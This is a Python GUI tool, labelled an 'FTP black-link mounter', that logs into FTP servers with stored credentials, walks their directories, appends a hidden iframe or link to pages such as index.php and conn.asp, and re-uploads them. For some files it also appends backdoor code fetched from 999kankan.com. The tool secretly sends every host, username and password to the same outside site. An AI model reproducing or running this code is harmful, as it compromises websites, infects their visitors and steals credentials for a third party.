# -*- coding: utf-8 -*-
from PyQt4 import QtCore, QtGui
from PyQt4.QtCore import *
from PyQt4.QtGui import *
import sys
import time
import re
import ftplib
import time
import urllib2
import os
import Chost   #'IP/地理位置/网站标题'
import Cmysql
import socket
import threading
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
import thread
from threading import Thread
from collections import defaultdict, deque
try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    _fromUtf8 = lambda s: s

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName(_fromUtf8("MainWindow"))
        MainWindow.resize(1251, 568)
        self.centralwidget = QtGui.QWidget(MainWindow)
        self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
        self.tableView = QtGui.QTableView(self.centralwidget)
        self.tableView.setGeometry(QtCore.QRect(7, 0, 1241, 421))
        self.tableView.setObjectName(_fromUtf8("tableView"))
        self.groupBox_2 = QtGui.QGroupBox(self.centralwidget)
        self.groupBox_2.setGeometry(QtCore.QRect(810, 420, 441, 101))
        self.groupBox_2.setObjectName(_fromUtf8("groupBox_2"))
        self.textEdit_2 = QtGui.QTextEdit(self.groupBox_2)
        self.textEdit_2.setGeometry(QtCore.QRect(10, 20, 421, 71))
        self.textEdit_2.setObjectName(_fromUtf8("textEdit_2"))
        self.groupBox = QtGui.QGroupBox(self.centralwidget)
        self.groupBox.setGeometry(QtCore.QRect(10, 430, 461, 91))
        self.groupBox.setObjectName(_fromUtf8("groupBox"))
        self.textEdit = QtGui.QTextEdit(self.groupBox)
        self.textEdit.setGeometry(QtCore.QRect(10, 20, 441, 61))
        self.textEdit.setObjectName(_fromUtf8("textEdit"))
        self.pushButton_3 = QtGui.QPushButton(self.centralwidget)
        self.pushButton_3.setGeometry(QtCore.QRect(480, 450, 141, 31))
        self.pushButton_3.setObjectName(_fromUtf8("pushButton_3"))
        self.pushButton_4 = QtGui.QPushButton(self.centralwidget)
        self.pushButton_4.setGeometry(QtCore.QRect(480, 490, 141, 31))
        self.pushButton_4.setObjectName(_fromUtf8("pushButton_4"))
        self.label_22 = QtGui.QLabel(self.centralwidget)
        self.label_22.setGeometry(QtCore.QRect(110, 420, 371, 30))
        self.label_22.setObjectName(_fromUtf8("label_22"))
        self.label_1 = QtGui.QLabel(self.centralwidget)
        self.label_1.setGeometry(QtCore.QRect(630, 440, 181, 21))
        self.label_1.setObjectName(_fromUtf8("label_1"))
        self.label_2 = QtGui.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(630, 460, 181, 21))
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.label_3 = QtGui.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(630, 480, 181, 21))
        self.label_3.setObjectName(_fromUtf8("label_3"))
        self.label_4 = QtGui.QLabel(self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(630, 500, 181, 21))
        self.label_4.setObjectName(_fromUtf8("label_4"))
        self.label_0 = QtGui.QLabel(self.centralwidget)
        self.label_0.setGeometry(QtCore.QRect(630, 420, 181, 21))
        self.label_0.setObjectName(_fromUtf8("label_0"))
        self.label = QtGui.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(470, 419, 161, 31))
        self.label.setObjectName(_fromUtf8("label"))
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtGui.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 1251, 23))
        self.menubar.setObjectName(_fromUtf8("menubar"))
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtGui.QStatusBar(MainWindow)
        self.statusbar.setObjectName(_fromUtf8("statusbar"))
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

        ###################################  信号和槽
        QtCore.QObject.connect(self.pushButton_3, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_3)
        QtCore.QObject.connect(self.pushButton_4, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_4)
        #######
        self.ini_Dialog()
        self.wwwlist = []    #wwwroot.txt  获取
        self.list_wwwlist=[]  #列表去重，不打乱原来的顺序
        self.FTP_list = []    #FTP保存路径
        self.data_write=u""  #写入数据
        self.open_txt()  #打开TXT文本写入数组
        self.message_data=u"" #消息提示
        self.hm_list=['conn.asp','CONN.asp','conn.php','CONN.php','index.asp','index.htm','index.php','index.html','index.jsp']  #添加啊后门列表
        self.int_label_0_1=0  #连接FTP/成功0个
        self.int_label_0_2=0  #连接FTP/失败0个
        self.int_label_1=0
        self.int_label_2=0
        self.int_label_3=0
        self.int_label_4=0
        ###################################

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(QtGui.QApplication.translate("MainWindow", "FTP黑链挂载器 1.1.5   谢谢 灰帽程序员论坛 hmhacker.org  技术帮助      BY:落雪QQ2602159946", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_2.setTitle(QtGui.QApplication.translate("MainWindow", "MsessageBox消息提示：", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox.setTitle(QtGui.QApplication.translate("MainWindow", "挂马地址：", None, QtGui.QApplication.UnicodeUTF8))
        self.pushButton_3.setText(QtGui.QApplication.translate("MainWindow", "开始", None, QtGui.QApplication.UnicodeUTF8))
        self.pushButton_4.setText(QtGui.QApplication.translate("MainWindow", "停止", None, QtGui.QApplication.UnicodeUTF8))
        self.label_22.setText(QtGui.QApplication.translate("MainWindow", "<html><head/><body><p align=\"center\"><span style=\" font-size:12pt; font-weight:600;\">按住CTRL选择要挂载的地址</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.label_1.setText(QtGui.QApplication.translate("MainWindow", "<html><head/><body><p align=\"center\">检测到0个页面</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.label_2.setText(QtGui.QApplication.translate("MainWindow", "<html><head/><body><p align=\"center\">下载成功0个页面</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.label_3.setText(QtGui.QApplication.translate("MainWindow", "<html><head/><body><p align=\"center\">超连接已存在0个页面</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.label_4.setText(QtGui.QApplication.translate("MainWindow", "<html><head/><body><p align=\"center\">上传成功0个页面</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.label_0.setText(QtGui.QApplication.translate("MainWindow", "<html><head/><body><p align=\"center\">连接FTP/成功0个/失败0个</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.label.setText(QtGui.QApplication.translate("MainWindow", "<html><head/><body><p align=\"center\"><span style=\" font-size:12pt;\">需要挂载0个地址</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))

    ###################################  FTP爆破
    def walk_ftp(self,ftp, cd = None, nodir = True):  #遍历FTP文件
        if cd:
            stack = [('d', cd)]
        else:
            stack = [('d', '/')]
        def get_item_info(line):  #获取目录信息
            info = line.split()  #string由字符串分割成的列表   但是这个地方没设置规则啊  难道以空格区分吗
            #info[0][0]获取是根目录还文件夹   info[8] 文件名称还是文件夹
            stack.append((info[0][0], '/'.join([pwd, info[8]])))  #pwd前所在位置
            #向列表的尾部添加一个新的元素
        while stack:
            s_top = stack.pop()
            if s_top[1][-2:]=='/.' or s_top[1][-3:]=='/..':
                continue #停止跳过这个
            if s_top[0] == '-': #根目录文件
                yield s_top[1].replace('//', '/')  #根据正则进行替换
            elif s_top[0] == 'd':  #文件夹
                try:
                    ftp.cwd(s_top[1])  #选择操作目录    打开文件夹
                except:
                    continue  #停止跳过这个异常
                pwd = ftp.pwd()  #返回当前所在位置
                ftp.dir(get_item_info)  #显示目录下文件信息
                if not nodir:  #not 取反   不明白什么意思
                    yield s_top[1].replace('//', '/') #根据正则进行替换

    def open_ftp(self,host,user,passwd):  #采集要挂马的地址
        try:
            self.del_list() #清空数组
            ftp = ftplib.FTP(host)
            ftp.login(user, passwd)
            self.textEdit_2.append(u"---------------------------") #添加消息
            self.message_data=u"IP:%s用户名:%s密码:%s 登陆FTP成功%s"%(host,user, passwd,time.strftime('%Y.%m.%d-%H.%M.%S')) #消息提示
            self.textEdit_2.append(self.message_data) #添加消息
            self.textEdit_2.append(u"开始遍历目录文件") #添加消息
            self.int_label_0_1+=1  #连接FTP/成功0个
            self.open_label()  #更新显示
            try:
                index=0

                for item in self.walk_ftp(ftp):
                    if index>=3000:
                        self.textEdit_2.append(u"遍历目录3000个文件过多停止") #添加消息
                        return 1
                    E = 0 #得到list的第一个元素
                    while E < len(self.list_wwwlist):
                        data=self.list_wwwlist[E]
                        data1=data.replace('\n','')
                        if not data1=="": #取反
                            if re.search(data1,item.split('/')[-1]):
                                self.FTP_list.append(item)
                                self.message_data=u"找到:%s"%(item) #消息提示
                                self.textEdit_2.append(self.message_data) #添加消息
                                self.int_label_1+=1  #检测到0个页面
                                self.open_label()  #更新显示
                        E += 1
                    time.sleep(0.001) #确保先运行Seeker中的方法
                    index +=1
                self.textEdit_2.append(u"遍历目录完成") #添加消息
                ftp.quit()  #退出ftp
                return 1
            except:
                ftp.quit()  #退出ftp
                self.textEdit_2.append(u"遍历FTP异常") #添加消息
                return 1
                #sys.exit(exitcode)   #退出这个函数   不是整个退出
        except:
            self.textEdit_2.append(u"---------------------------") #添加消息
            self.message_data=u"IP:%s用户名:%s密码:%s 连接FTP异常%s"%(host,user, passwd,time.strftime('%Y.%m.%d-%H.%M.%S')) #消息提示
            self.textEdit_2.append(self.message_data) #添加消息
            self.int_label_0_2+=1  #连接FTP/失败0个
            self.open_label()  #更新显示
            return 0

    ###########
            #遍历数组   下载   修改   上传
    def open_list(self,host,user,passwd):#遍历数组
        try:
            ftpU = ftplib.FTP(host)
            ftpU.login(user, passwd)
            try:
                E = 0 #得到list的第一个元素
                while E < len(self.FTP_list):
                    self.message_data+=u"开始处理%s地址"%(self.FTP_list[E]) #消息提示
                    self.textEdit_2.append(u"-------") #添加消息
                    if self.ftp_download(ftpU,self.FTP_list[E]):  #下载
                        if self.hm_LT(self.FTP_list[E]): #查看是否要添加后门
                            #是
                            if self.hm_txt_write(self.FTP_list[E]):  #向文本中写入数据
                                if self.ftp_upload(ftpU,self.FTP_list[E]): #上传文件
                                    self.message_data+=u"%s下载-修改-上传-文件完成"%(self.FTP_list[E]) #消息提示
                        else:
                            #否
                            if self.txt_write(self.FTP_list[E]):  #向文本中写入数据
                                if self.ftp_upload(ftpU,self.FTP_list[E]): #上传文件
                                    self.message_data+=u"%s下载-修改-上传-文件完成"%(self.FTP_list[E]) #消息提示
                        self.del_file(self.FTP_list[E])  #删除文件
                        self.textEdit_2.append(self.message_data) #添加消息
                        self.textEdit_2.append(u"-------") #添加消息
                        self.message_data=u"" #消息提示
                    E = E + 1
                self.textEdit_2.append(u"遍历目录修改上传完成"+time.strftime('%Y.%m.%d-%H.%M.%S')) #添加消息
                ftpU.quit()  #退出ftp
                return 1
            except:
                ftpU.quit()  #退出ftp
                self.textEdit_2.append(u"遍历FTP异常") #添加消息
                return 1
        except:
            self.textEdit_2.append(u"---------------------------") #添加消息
            self.message_data=u"IP:%s用户名:%s密码:%s 连接FTP异常%s"%(host,user, passwd,time.strftime('%Y.%m.%d-%H.%M.%S')) #消息提示
            self.textEdit_2.append(self.message_data) #添加消息
            return 0

    def del_file(self,ftp_download):  #删除文件
        try:
            item=str(ftp_download)
            nPos = item.rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            feil=os.getcwd()  #获得当前工作目录
            #data1=feil+"\\"+sStr1
            #print data1
            for allDirs,dirs,filename in os.walk(feil):
                if sStr1 in filename:
                    os.remove(feil + "/" + sStr1)
                    #    print("\n删除成功！")
                    #if sStr1 not in filename:
                    #    print("未找到所要删除的文件！")
            return 0
        except:
            return 0
            #####################
        #后门部分
    def post_url(self):  #获取后门
        try:
            URL="http://999kankan.com/conn.txt"
            s = urllib2.urlopen(URL,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            ss = s.read()
            data1=ss.replace('bing','')
            data2=data1.replace('end','')
            return data2
        except:
            #print u"获取后门失败"
            return ""

    def hm_LT(self,ftp_download): #查看是否要添加后门
        try:
            item=str(ftp_download)
            nPos = item.rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            E = 0 #得到list的第一个元素
            while E < len(self.hm_list):
                if self.hm_list[E]==sStr1:
                    return 1
                E = E + 1
            return 0
        except:
            return 0

    def hm_txt_write(self,ftp_download):  #向文本中写入数据
        try:
            item=str(ftp_download)
            nPos = item.rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            f = open(sStr1,'r')

            data=f.read()
            f.close()  #关闭文本
            hmdata=self.post_url()  #获取后门
            hmdata1=hmdata+"\r\n"+self.data_write
            nPos = str(data).rfind(str(hmdata1)) #查找字符
            if nPos>0:
                self.message_data+=u"已经有要写入的数据了不在写入" #消息提示
                self.int_label_3+=1  #超连接已存在0个页面
                self.open_label()  #更新显示
                return 0
            else:
                file_object = open(sStr1,'a')  #追加写文件
                file_object.write(hmdata1)
                #file_object.writelines(list_of_text_strings)  #写入多行
                file_object.close()
                return 1
        except:
            self.message_data+=u"写入数据%s失败"%(ftp_download) #消息提示
            return 0
    #####################
            #向文本中写入数据
    def txt_write(self,ftp_download):  #向文本中写入数据
        try:
            item=ftp_download
            nPos = str(item).rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            f = open(sStr1, 'r')

            data=f.read()
            f.close()  #关闭文本
            nPos = str(data).rfind(str(self.data_write)) #查找字符
            if nPos>0:
                self.message_data+=u"已经有要写入的数据了不在写入" #消息提示
                self.int_label_3+=1  #超连接已存在0个页面
                self.open_label()  #更新显示
                return 0
            else:
                file_object = open(sStr1,'a')  #追加写文件
                file_object.write(self.data_write)
                #file_object.writelines(list_of_text_strings)  #写入多行
                file_object.close()
                return 1
        except:
            self.message_data+=u"写入数据%s失败"%(ftp_download) #消息提示
            return 0

    #下载
    def ftp_download(self,ftpU,ftp_download):  #下载
        try:
            #ftp_download = "/home/pub/dog.jpg";
            #print ftp.getwelcome() #显示ftp服务器欢迎信息
            bufsize = 1024 #设置缓冲块大小
            item=ftp_download
            nPos = str(item).rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            fp = open(sStr1,'wb') #以写模式在本地打开文件
            ftpU.retrbinary('RETR ' + ftp_download,fp.write,bufsize) #接收服务器上文件并写入本地文件
            self.message_data+=u"%s下载成功"%(ftp_download) #消息提示
            self.int_label_2+=1  #下载成功0个页面
            self.open_label()  #更新显示
            return 1
        except:
            self.message_data+=u"%s下载失败"%(ftp_download) #消息提示
            return 0

    #上传文件
    def ftp_upload(self,ftpU,ftp_download): #上传文件
        try:
            item=ftp_download
            nPos = str(item).rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            bufsize = 1024
            fp = open(sStr1,'rb')
            ftpU.storbinary('STOR '+ ftp_download,fp,bufsize) #上传文件
            #ftpU.set_debuglevel(0)  #关闭调试模式
            fp.close() #关闭文件
            #ftpU.quit()   #退出ftp
            self.message_data+=u"%s上传文件文件成功"%(sStr1) #消息提示
            self.int_label_4+=1  #上传成功0个页面
            self.open_label()  #更新显示
            return 1
        except:
            self.message_data+=u"%s上传文件失败"%(ftp_download) #消息提示
            return 0
    ###########
    def open_txt(self):  #打开TXT文本写入数组
        try:
            xxx = file('wwwroot.txt', 'r')
            #for xxx_line in xxx.read().split('\n'):
            for xxx_line in xxx.readlines():
                self.wwwlist.append(xxx_line)
            xxx.close()

            for i in self.wwwlist:  #列表去重复
                if i not in self.list_wwwlist:
                    self.list_wwwlist.append(i)
        except:
            return 0

    def del_list(self): #清空数组
        i = 0 #得到list的第一个元素
        while i < len(self.FTP_list):
            del self.FTP_list[i]
    ###################################
    def open_FTP(self,host,user,passwd):#遍历数组
        try:
            if self.open_ftp(host,user,passwd):  #采集要挂马的地址
            #print u"获取别表完成"
                self.message_data=u"查找到要挂的链接%s个"%(len(self.FTP_list)) #消息提示
                self.textEdit_2.append(self.message_data) #添加消息
                if len(self.FTP_list)>0:  #判断有连接需要挂黑链没
                    self.open_list(host,user,passwd)#遍历数组
            return 1
        except:
            return 0

    def url_post(self,URL):
        try:
            urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            time.sleep(3)
        except:
            return 0

    def for_tableView(self):  #获取列表多少被选中
    #print self.tableView.selectionModel().selectedRows().count()
        #print self.tableView.selectionModel().selectedIndexes()   #selectionModel->selectedRows();　//获得被选中的行
        #int_View=self.tableView.model().rowCount()   #获取共多少行
        #print self.tableView.model().columnCount()  #获取共多少列
        int_model = self.tableView.selectionModel()  #获取选中编号
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_index=index.row()#获取行号
            host= model.data(model.index(int_index,0)).toString()
            user= model.data(model.index(int_index,1)).toString()
            passwd= model.data(model.index(int_index,2)).toString()
            self.open_FTP(str(host),str(user),str(passwd))#遍历数组
            URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=2"%(host,user,passwd)
            self.url_post(URL)   #后门
            time.sleep(1)
        #解除锁定
        self.pushButton_3.setEnabled(1) #开始
        self.pushButton_4.setEnabled(0) #停止 #给改成禁用

    def open_label(self):  #更新数据
        data0=u"<html><head/><body><p align="+u"center"+u">连接FTP/成功%s个/失败%s个</p></body></html>"%(self.int_label_0_1,self.int_label_0_2)
        self.label_0.setText(data0)

        data1=u"<html><head/><body><p align="+u"center"+u">检测到%s个页面</p></body></html>"%(self.int_label_1)
        self.label_1.setText(data1)

        data2=u"<html><head/><body><p align="+u"center"+u">下载成功%s个页面</p></body></html>"%(self.int_label_2)
        self.label_2.setText(data2)

        data3=u"<html><head/><body><p align="+u"center"+u">超连接已存在%s个页面</p></body></html>"%(self.int_label_3)
        self.label_3.setText(data3)

        data4=u"<html><head/><body><p align="+u"center"+u">上传成功%s个页面</p></body></html>"%(self.int_label_4)
        self.label_4.setText(data4)

    #按钮事件处理
    def Button_3(self):
        URL=self.textEdit.toPlainText() #获取内容
        if str(URL).rfind('www.baidu.com')>0: #查找字符
            QtGui.QMessageBox.information(None,u'提示', u'挂马地址请换成自己的')    # 创建Information消息框
            return 0
        self.data_write=URL
        #self.open_FTP("127.0.0.1","admin","admin")#遍历数组
        self.int_label_0_1=0  #连接FTP/成功0个
        self.int_label_0_2=0  #连接FTP/失败0个
        self.int_label_1=0
        self.int_label_2=0
        self.int_label_3=0
        self.int_label_4=0
        self.open_label()  #更新数据
        int_model = self.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        data4=u"<html><head/><body><p align="+u"center"+u"><span style=" +u"font-size:12pt;"+u">需要挂载%d个地址</span></p></body></html>"%(int_id)
        self.label.setText(data4)
        self.pushButton_3.setEnabled(0)  #给改成禁用
        self.pushButton_4.setEnabled(1)
        thread.start_new_thread(self.for_tableView,())

    def Button_4(self):
        self.pushButton_3.setEnabled(1) #开始
        self.pushButton_4.setEnabled(0) #停止 #给改成禁用
    ###################################
    def int_mysql_tableView(self): #获取表中有多少条记录
        i=0
        try:
            self.sql=Cmysql.mysql_handle()
            self.sql.mysql_open()
            sql="select * from ftppassword3"
            self.cursor=self.sql.conn.cursor()
            n = self.cursor.execute(sql)
            self.cursor.scroll(0)
            for row in self.cursor.fetchall():
                i+=1
            self.cursor.close()
            return i
        except:
            self.textEdit_2.append(u"无法连接数据库====读取数据库表ftppassword3错误")
            return i

    def mysql_tableView(self): #获取表中有多少条记录
        try:
            i=0
            self.sql=Cmysql.mysql_handle()
            self.sql.mysql_open()
            sql="select * from ftppassword3"
            self.cursor=self.sql.conn.cursor()
            n = self.cursor.execute(sql)
            self.cursor.scroll(0)
            for row in self.cursor.fetchall():
                data0=u"%s"%(row[0])
                if not data0==None:
                    self.model.setItem(i, 0, QStandardItem(data0))
                data1=u"%s"%(row[1])
                if not data1==None:
                    self.model.setItem(i, 1, QStandardItem(data1))
                data2=u"%s"%(row[2])
                if not data2==None:
                    self.model.setItem(i, 2, QStandardItem(data2))
                data3=u"%s"%(row[3])
                if not data3==None:
                    self.model.setItem(i, 3, QStandardItem(data3))
                data4=u"%s"%(row[4])
                if not data4==None:    #if data3 is not None
                    self.model.setItem(i, 4, QStandardItem(data4))
#                data5=u"%s"%(row[5])
#                if not data5==None:
#                    self.model.setItem(i, 5, QStandardItem(data5))

                L_RGB=row[3]
                if L_RGB=='NO': #查找字符  红色
                    self.model.item(i,0).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    self.model.item(i,1).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    self.model.item(i,2).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    #self.model.item(i,3).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    #self.model.item(i,4).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    #self.model.item(i,5).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色

                if L_RGB=='1': #查找字符  橙黄 ； 247,148,29
                    self.model.item(i,0).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    self.model.item(i,1).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    self.model.item(i,2).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    #self.model.item(i,3).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    #self.model.item(i,4).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    #self.model.item(i,5).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色

                if L_RGB=='2': #查找字符  巧克力色： 210,105,30
                    self.model.item(i,0).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    self.model.item(i,1).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    self.model.item(i,2).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    #self.model.item(i,3).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    #self.model.item(i,4).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    #self.model.item(i,5).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                i+=1
            self.cursor.close()
            return 1
        except:
            self.textEdit_2.append(u"获取表ftppassword3错误")
            return 0

    def host_lib(self,www):  #获取主机信息
        h=Chost.C_hoset()
        data=""
        try:
            data=h.www_data(www)   #'IP/地理位置/网站标题'
            data=data.replace('<title>','')
            data=data.replace('</title>','')
            #data1=str(data.decode('utf-8'))
            #        self.textEdit_2.append(data) #添加消息
            #        self.model.setItem(0, 5, QStandardItem(data))
            #        self.tableView.setModel(self.model)
            return data
        except:
            return data

    def host_TX(self):  #添加主机信息
        int_View=self.tableView.model().rowCount()   #获取共多少行
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in range(int_View):
            host= model.data(model.index(index,0)).toString()
            data=self.host_lib(str(host))  #获取主机信息
            #self.textEdit_2.append(data) #添加消息
            self.model.setItem(index, 5, QStandardItem(data))
            self.tableView.setModel(self.model)
            time.sleep(1)

    def ini_Dialog(self):
    #########################
        self.led=self.int_mysql_tableView() #获取表中有多少条记录

        self.model = QStandardItemModel()
        self.model.setColumnCount(6)     #列
        self.model.setRowCount(self.led+3)  #行  len(node)
        self.model.setHorizontalHeaderLabels([u'IP(域名)',u'用户名',u'密码',u'root权限',u'time时间',u'IP/地理位置/网站标题'])
        self.tableView.setModel(self.model)

        self.mysql_tableView() #获取表中有多少条记录
        self.tableView.setModel(self.model)

        #self.tableView.resizeColumnsToContents()   #由内容调整列
        self.tableView.setColumnWidth(0,150)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(1,100)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(2,100)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(3,60)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(4,125)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(5,680)  #设置表格的各列的宽度值
        for i in range(self.led+3):  #调整行高度  len(node)
            self.tableView.setRowHeight(i, 20)

        self.tableView.setEditTriggers(QTableWidget.NoEditTriggers)  #设置表格的单元为只读属性，即不能编辑
        self.tableView.setSelectionBehavior(QTableWidget.SelectRows) #点击选择是选择行//设置选中时为整行选中
        #self.tableView.setSelectionMode(QTableWidget.SingleSelection)  #禁止多行选择
        self.tableView.setAlternatingRowColors(True)  #还是只可以选择单行（单列）
        self.tableView.verticalHeader().hide() #隐藏行头

        thread.start_new_thread(self.host_TX,()) #用线程获取
        #########################
        self.pushButton_3.setEnabled(1) #开始
        self.pushButton_4.setEnabled(0) #停止 #给改成禁用

        self.textEdit.append(u"<iframe src=http://www.baidu.com/ width=0 height=0></iframe>")
        #self.textEdit_2.setEnabled(0)  #给改成禁用
        self.textEdit_2.append(u"欢迎使用FTP黑链挂载器---"+time.strftime('%Y.%m.%d-%H.%M.%S'))
        self.textEdit_2.append(u"只需要设置wwwroot.txt要挂载的文件名就可以了，软件会自动遍历FTP查找")
        self.textEdit_2.append(u"root 权限解释")
        self.textEdit_2.append(u"0  连接不上FTP")
        self.textEdit_2.append(u"1  连接成功什么权限都没给")
        self.textEdit_2.append(u"2  仅有上传权限")
        self.textEdit_2.append(u"3  有上传和删除权限")
        #########################

class Start(QtGui.QMainWindow):
    def __init__(self,parent=None):
        QtGui.QWidget.__init__(self,parent)
        self.ui=Ui_MainWindow()#这儿跟上面那个class一样
        self.ui.setupUi(self)
        #self.ui.ini_Dialog()

if __name__=="__main__":
    app=QtGui.QApplication(sys.argv)
    myapp=Start()
    myapp.show()
    sys.exit(app.exec_())
